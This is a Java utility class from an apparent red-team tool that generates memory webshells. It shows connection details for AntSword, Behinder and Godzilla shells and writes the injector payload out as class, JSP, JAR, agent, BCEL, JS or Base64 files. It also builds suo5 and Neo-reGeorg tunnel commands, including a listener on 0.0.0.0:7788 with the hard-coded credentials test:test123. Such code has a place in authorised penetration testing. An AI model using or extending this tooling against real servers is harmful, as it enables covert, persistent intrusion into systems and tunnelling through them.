package com.potato.potatotool.content.redTeam.memshell.util;


import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import me.gv7.woodpecker.tools.common.FileUtil;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Potato
 * @date 2024/7/29 15:52
 */
public class ShowResultsUtil {

    public static Map<String, String> generateShowResultMap(MemoryObj memoryObj) {
        Map<String, String> resultMap = new HashMap<>();
        switch (memoryObj.getToolType()) {
            case MemoryShellConstants.TOOL_ANTSWORD:
                resultMap.put("密码", memoryObj.getPass());
                resultMap.put("请求路径", memoryObj.getUrlPattern());
                resultMap.put("请求头", memoryObj.getHeaderName() + ": " + memoryObj.getHeaderValue());
                resultMap.put("脚本类型", "JSP");
                break;
            case MemoryShellConstants.TOOL_BEHINDER:
                resultMap.put("密码", memoryObj.getPass());
                resultMap.put("请求路径", memoryObj.getUrlPattern());
                resultMap.put("请求头", memoryObj.getHeaderName() + ": " + memoryObj.getHeaderValue());
                resultMap.put("脚本类型", "JSP");
                resultMap.put("内存马类名", memoryObj.getShellClassName());
                resultMap.put("注入器类名", memoryObj.getInjectorClassName());
                break;
            case MemoryShellConstants.TOOL_GODZILLA:
                resultMap.put("加密器", "JAVA_AES_BASE64");
                resultMap.put("密码", memoryObj.getPass());
                resultMap.put("密钥", memoryObj.getKey());
                resultMap.put("请求路径", memoryObj.getUrlPattern());
                resultMap.put("请求头", memoryObj.getHeaderName() + ": " + memoryObj.getHeaderValue());
                resultMap.put("脚本类型", "JSP");
                break;
            case MemoryShellConstants.TOOL_SUO5:
                resultMap.put("请求路径", memoryObj.getUrlPattern());
                resultMap.put("连接指令", getSuo5ConnectionCommand(memoryObj));
                break;
            case MemoryShellConstants.TOOL_NEOREGEORG:
                resultMap.put("密钥", memoryObj.getKey());
                resultMap.put("请求路径", memoryObj.getUrlPattern());
                resultMap.put("连接指令", getNeoreGeorgConnectionCommand(memoryObj));
                break;
        }

        if (memoryObj.getExprEncoder() != null) {
//            try {
//                transformOutputFormat(memoryObj);
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
            String[] results = JexprUtil.generateExp(memoryObj);
            resultMap.put("表达式封装结果", String.valueOf(results));
        } else {
            switch (memoryObj.getOutputFormat()) {
                case MemoryShellConstants.OUTPUTFORMAT_CLASS:
                case MemoryShellConstants.OUTPUTFORMAT_JSP:
                case MemoryShellConstants.OUTPUTFORMAT_JAR:
                case MemoryShellConstants.OUTPUTFORMAT_JAR_AGENT:
                    try {
                        memoryObj.setSavePath(getOutputFilePath(memoryObj.getOutputFormat(), memoryObj.getInjectorSimpleClassName(), memoryObj.getSavePath()));
                        FileUtil.writeFile(memoryObj.getSavePath(), transformOutputFormat(memoryObj));
                        resultMap.put("文件路径", memoryObj.getSavePath());
                    } catch (Throwable e) {
                        resultMap.put("文件路径", "错误");
                    }
                    break;
                case MemoryShellConstants.OUTPUTFORMAT_BCEL:
                case MemoryShellConstants.OUTPUTFORMAT_JS:
                case MemoryShellConstants.OUTPUTFORMAT_BASE64:
                case MemoryShellConstants.OUTPUTFORMAT_BIGINTEGER:
                    try {
                        // base64/bcel/js/biginteger 根据配置对象，生成格式化后的字节码文本
                        String result = new String(transformOutputFormat(memoryObj));
                        resultMap.put("结果", result);
                    } catch (Throwable e) {
                        resultMap.put("结果", "错误");
                    }
                    break;
            }
        }

        return resultMap;
    }

    /**
     * 根据格式类型、类的简单名称和输出路径，生成文件的输出路径。
     *
     * @param formatType     文件格式类型
     * @param className      类的简单名称
     * @param outputPath     输出路径
     * @return 生成的文件输出路径
     */
    public static String getOutputFilePath(String formatType, String className, String outputPath) {
        File file = new File(outputPath);
        String fileSeparator = File.separator;

        // 处理特定的文件扩展名情况
        if (outputPath.endsWith(".class") || outputPath.endsWith(".jar") || outputPath.endsWith(".jsp")) {
            outputPath = file.getParent();
        }

        // 检查路径是否是文件路径
        boolean isFilePath = outputPath.contains(".");
        if (isFilePath) {
            File parentDir = file.getParentFile();
            if (!parentDir.exists()) {
                parentDir.mkdirs();
            }
            return file.getAbsolutePath();
        }

        // 确保输出目录存在
        File dir = new File(outputPath);
        if (!dir.exists() || !dir.isDirectory()) {
            dir.mkdirs();
        }

        // 根据格式类型生成输出文件路径
        String fileOutputPath = null;
        switch (formatType) {
            case MemoryShellConstants.OUTPUTFORMAT_CLASS:
                fileOutputPath = outputPath + fileSeparator + className + ".class";
                break;
            case MemoryShellConstants.OUTPUTFORMAT_JAR:
            case MemoryShellConstants.OUTPUTFORMAT_JAR_AGENT:
                fileOutputPath = outputPath + fileSeparator + className + ".jar";
                break;
            case MemoryShellConstants.OUTPUTFORMAT_JSP:
                fileOutputPath = outputPath + fileSeparator + className + ".jsp";
                break;
        }

        return fileOutputPath;
    }

    // 获取字节码并转换格式
    private static byte[] transformOutputFormat(MemoryObj memoryObj) throws Exception{
        byte[] classBytes;
        classBytes = memoryObj.getInjectorBytes();
        if (classBytes == null) {
            return null;
        }

        // 格式转换
        byte[] bytes = null;
        switch (memoryObj.getOutputFormat()) {
            case MemoryShellConstants.OUTPUTFORMAT_BCEL:
                bytes = FormatUtil.BcelFormat(memoryObj);
                break;
            case MemoryShellConstants.OUTPUTFORMAT_JSP:
                bytes = FormatUtil.JspFormat(classBytes, memoryObj);
                break;
            case MemoryShellConstants.OUTPUTFORMAT_JAR:
                bytes = FormatUtil.JARFormat(classBytes, memoryObj);
                break;
            case MemoryShellConstants.OUTPUTFORMAT_JAR_AGENT:
                bytes = FormatUtil.JARAgentFormat(classBytes, memoryObj);
                break;
            case MemoryShellConstants.OUTPUTFORMAT_JS:
                bytes = FormatUtil.JsFormat(classBytes, memoryObj);
                break;
            case MemoryShellConstants.OUTPUTFORMAT_BASE64:
                bytes = FormatUtil.Base64Format(classBytes);
                break;
            case MemoryShellConstants.OUTPUTFORMAT_BIGINTEGER:
                bytes = FormatUtil.BigIntegerFormat(classBytes);
                break;
            default:
                bytes = classBytes;
                break;
        }
        return bytes;
    }

    private static String getSuo5ConnectionCommand(MemoryObj memoryObj) {
        if (memoryObj.getHeaderName().equalsIgnoreCase("user-agent")) {
            return String.format("./suo5 -d --ua '%s' -t http://\n" +
                            "./suo5 -d -l 0.0.0.0:7788 --auth test:test123 --ua '%s' -t http://",
                    memoryObj.getHeaderValue(), memoryObj.getHeaderValue());
        } else {
            return String.format("./suo5 -H '%s: %s' -t http://\n" +
                            "./suo5 -l 0.0.0.0:7788 --auth test:test123 -H '%s: %s' -t http://",
                    memoryObj.getHeaderName(), memoryObj.getHeaderValue(), memoryObj.getHeaderName(), memoryObj.getHeaderValue());
        }
    }

    private static String getNeoreGeorgConnectionCommand(MemoryObj memoryObj) {
        return String.format("python3 neoreg.py -k %s -H '%s:%s' -u http://\n" +
                        "python3 neoreg.py --skip --proxy http://127.0.0.1:8080 -vv -k %s -H '%s:%s' -u http://",
                memoryObj.getKey(), memoryObj.getHeaderName(), memoryObj.getHeaderValue(), memoryObj.getKey(), memoryObj.getHeaderName(), memoryObj.getHeaderValue());
    }

}
